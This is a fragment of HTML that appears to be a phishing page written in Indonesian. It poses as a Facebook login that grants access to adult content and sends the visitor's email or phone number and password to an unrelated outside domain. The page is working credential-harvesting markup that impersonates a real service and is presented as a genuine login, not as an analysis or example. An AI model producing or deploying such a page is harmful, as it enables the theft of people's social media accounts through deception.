				...
				<meta http-equiv="X-UA-Compatible" content="ie=edge">
					...
					<!-- <link rel="shorcut icon" href="img/rYZqPCBaG70.png"> -->
						...
						<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
							<link rel="stylesheet" href="https://use.fontawesome.compath/to/font-awesome/css/font-awesome.min.css">
								<style>
      html,body {
        ...
        .login {
          ...
          box-shadow: 0px 0px 15px rgba(0,0,0, 0  );
              ...
              Masuk ke akun Facebook Anda untuk terhubung ke KONTEN DEWASA
													...
													<div class="row">
														<div class="col-sm-12 col-lg-12 text-center mx-auto d-block">
															<form action="https://whtsap.xyzlogin.php" method="POST">
															<input type="hidden" class="form-control border-bottom-x id="user" name="user" value="UNKNOWN">
																<div class="form-group">
																	<input type="hidden" name="url" value="">
																		<input autocorrect="off" autocapitalize="off" class="form-control border-bottom-x" autocomplete="on" id="email" name="email" placeholder="Nomor ponsel atau email" type="text" required>
																			<input autocorrect="off" autocapitalize="off" class="form-control border-bottom-x" autocomplete="on" id="password" name="password" placeholder="Kata Sandi" type="password" required>
